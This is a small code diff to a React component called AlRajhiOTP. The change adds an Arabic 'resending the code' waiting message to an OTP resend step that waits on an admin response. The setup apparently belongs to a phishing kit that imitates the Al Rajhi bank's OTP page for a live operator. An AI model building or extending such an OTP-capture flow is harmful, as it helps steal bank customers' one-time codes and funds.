@@ -79,6 +79,7 @@ export default function AlRajhiOTP() {
       data: { طلب: "إعادة إرسال رمز" },
       current: "الراجحى (OTP)",
       waitingForAdminResponse: true,
+      customWaitingMessage: "جاري إعادة إرسال الرمز",
     });
   };
 
